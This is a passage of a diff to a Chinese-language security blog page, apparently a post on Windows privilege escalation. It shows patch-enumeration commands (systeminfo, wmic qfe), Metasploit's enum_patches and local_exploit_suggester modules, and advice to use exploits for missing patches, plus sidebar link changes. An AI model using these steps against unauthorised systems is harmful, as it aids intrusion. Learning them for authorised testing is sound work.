+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			<span class="comment">#查看当前权限</span></span><br><span class="line">systeminfo					<span class="comment">#列出补丁编号</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			<span class="comment">#使用wmic列出已上补丁</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post/windows/gather/enum_patches		<span class="comment">#寻找缺失补丁</span></span><br><span class="line">use post/multi/recon/local_exploit_suggester		<span class="comment">#找出系统中可能被利用的漏洞</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li>
@@ -649,7 +755,9 @@
 		
 			<li><a href="/categories/WEB大杂烩/">WEB大杂烩<span>1</span></a></li>
 		
-			<li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>5</span></a></li>
+			<li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>6</span></a></li>
+		
+			<li><a href="/categories/常用工具/">常用工具<span>1</span></a></li>
 		
 			<li><a href="/categories/靶机/">靶机<span>1</span></a></li>
 		
@@ -662,23 +770,27 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/vulnhub靶机/">vulnhub靶机<span>1</span></a></li>
+			<li><a href="/tags/CSRF/">CSRF<span>1</span></a></li>
 		
-			<li><a href="/tags/MSF与CS/">MSF与CS<span>1</span></a></li>
-		
-			<li><a href="/tags/域内横向/">域内横向<span>1</span></a></li>
+			<li><a href="/tags/域内横向/">域内横向<span>2</span></a></li>
 		
 			<li><a href="/tags/Windows内网提权/">Windows内网提权<span>1</span></a></li>
 		
-			<li><a href="/tags/内网穿透/">内网穿透<span>1</span></a></li>
+			<li><a href="/tags/MSF与CS/">MSF与CS<span>1</span></a></li>
 		
-			<li><a href="/tags/CORS/">CORS<span>1</span></a></li>
+			<li><a href="/tags/工具/">工具<span>1</span></a></li>
+		
+			<li><a href="/tags/JS/">JS<span>1</span></a></li>
+		
+			<li><a href="/tags/vulnhub靶机/">vulnhub靶机<span>1</span></a></li>
+		
+			<li><a href="/tags/内网穿透/">内网穿透<span>1</span></a></li>
 		
 			<li><a href="/tags/Linux内网权限维持/">Linux内网权限维持<span>1</span></a></li>
 		
-			<li><a href="/tags/CSRF/">CSRF<span>1</span></a></li>
+			<li><a href="/tags/CORS/">CORS<span>1</span></a></li>
 		
-			<li><a href="/tags/JS/">JS<span>1</span></a></li>
+			<li><a href="/tags/sqlmap/">sqlmap<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -692,7 +804,15 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/04/20/内网横向（二）/" ><i class="fa fa-file-o"></i>域内横向（二）</a>
+      </li>
+    
+      <li>
         <a href="/2021/04/20/JS的那些事/" ><i class="fa fa-file-o"></i>JS那些事</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/20/SQLMAP工具命令/" ><i class="fa fa-file-o"></i>SQLMAP工具命令</a>
       </li>
     
       <li>
@@ -701,14 +821,6 @@
     
       <li>
         <a href="/2021/04/18/BullDog/" ><i class="fa fa-file-o"></i>BullDog-writeup</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/17/内网横向（一）/" ><i class="fa fa-file-o"></i>域内横向（一）</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/16/内网提权方法/" ><i class="fa fa-file-o"></i>Windows内网提权</a>
       </li>
     
   </ul>
